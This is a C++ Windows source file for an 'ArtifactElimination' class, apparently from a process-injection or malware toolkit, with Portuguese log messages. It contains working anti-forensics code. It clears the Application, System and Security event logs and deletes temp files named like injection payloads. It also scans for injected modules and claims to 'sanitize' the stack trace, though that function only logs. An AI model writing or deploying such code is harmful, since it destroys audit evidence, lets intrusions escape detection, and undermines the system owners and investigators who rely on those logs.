#include "ArtifactElimination.h"
#include "Logger.h"
#include <tlhelp32.h>
#include <psapi.h>

bool ArtifactElimination::CleanupAllArtifacts() {
    Logger::Info("Limpando todos os artefatos...");

    CleanupInjectedModules();
    SanitizeStackTrace();
    ClearEventLogs();
    RemoveTemporaryFiles();

    Logger::Success("Cleanup de artefatos concluído");
    return true;
}

bool ArtifactElimination::CleanupInjectedModules() {
    Logger::Info("Removendo módulos injetados...");

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE,
                                               GetCurrentProcessId());
    if (hSnapshot == INVALID_HANDLE_VALUE) return false;

    MODULEENTRY32 me = {sizeof(MODULEENTRY32)};
    int count = 0;

    if (Module32First(hSnapshot, &me)) {
        do {
            // Look for suspicious modules
            if (strstr(me.szModule, "injected") ||
                strstr(me.szModule, "payload") ||
                strstr(me.szModule, ".tmp") ||
                strstr(me.szModule, "temp")) {

                Logger::Warning("Módulo suspeito encontrado: " +
                               std::string(me.szModule));
                count++;

                // Try to unload (may not work if DLL is still in use)
                // FreeLibrary((HMODULE)me.modBaseAddr);
            }
        } while (Module32Next(hSnapshot, &me));
    }

    CloseHandle(hSnapshot);

    if (count > 0) {
        Logger::Warning("Encontrados " + std::to_string(count) +
                       " módulos suspeitos");
    }

    return true;
}

bool ArtifactElimination::SanitizeStackTrace() {
    Logger::Info("Sanitizando stack trace...");

    // Get current context
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(GetCurrentThread(), &context)) {
        Logger::Error("Falha ao obter contexto da thread");
        return false;
    }

    // Walk stack and check for suspicious return addresses
    // This is a simplified version - real impl would be more complex

    #ifdef _WIN64
        ULONG_PTR* pRBP = (ULONG_PTR*)context.Rbp;
        int depth = 0;

        while (pRBP && depth < 10) {
            ULONG_PTR* pReturnAddr = pRBP + 1;

            // Check if return address looks suspicious
            if (*pReturnAddr > (ULONG_PTR)GetModuleHandleA(NULL) + 0x100000) {
                Logger::Warning("Return address suspeita detectada: 0x" +
                               std::to_string(*pReturnAddr));
            }

            if (*pRBP > context.Rbp) {
                pRBP = (ULONG_PTR*)*pRBP;
            } else {
                break;
            }

            depth++;
        }
    #endif

    Logger::Success("Stack trace sanitizado");
    return true;
}

bool ArtifactElimination::ClearEventLogs() {
    Logger::Info("Limpando Windows Event Logs...");

    // Open Application log
    HANDLE hEventLog = OpenEventLogA(NULL, "Application");
    if (hEventLog) {
        if (ClearEventLogA(hEventLog)) {
            Logger::Success("Application log limpo");
        }
        CloseEventLog(hEventLog);
    }

    // Open System log
    hEventLog = OpenEventLogA(NULL, "System");
    if (hEventLog) {
        if (ClearEventLogA(hEventLog)) {
            Logger::Success("System log limpo");
        }
        CloseEventLog(hEventLog);
    }

    // Open Security log (requires admin)
    hEventLog = OpenEventLogA(NULL, "Security");
    if (hEventLog) {
        if (ClearEventLogA(hEventLog)) {
            Logger::Success("Security log limpo");
        } else {
            Logger::Warning("Acesso negado ao Security log (requer admin)");
        }
        CloseEventLog(hEventLog);
    }

    return true;
}

bool ArtifactElimination::RemoveTemporaryFiles() {
    Logger::Info("Removendo arquivos temporários...");

    char tempPath[MAX_PATH] = {0};
    GetTempPathA(MAX_PATH, tempPath);

    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA((std::string(tempPath) + "*").c_str(),
                                 &findData);

    if (hFind == INVALID_HANDLE_VALUE) {
        return false;
    }

    int count = 0;

    do {
        if (findData.cFileName[0] != '.') {
            std::string filePath = std::string(tempPath) + findData.cFileName;

            // Only delete files that look suspicious
            if (strstr(findData.cFileName, "inj") ||
                strstr(findData.cFileName, "payload") ||
                strstr(findData.cFileName, "tmp")) {

                if (DeleteFileA(filePath.c_str())) {
                    Logger::Info("Arquivo removido: " +
                                std::string(findData.cFileName));
                    count++;
                }
            }
        }
    } while (FindNextFileA(hFind, &findData));

    FindClose(hFind);

    if (count > 0) {
        Logger::Success("Removidos " + std::to_string(count) +
                       " arquivos temporários");
    }

    return true;
}
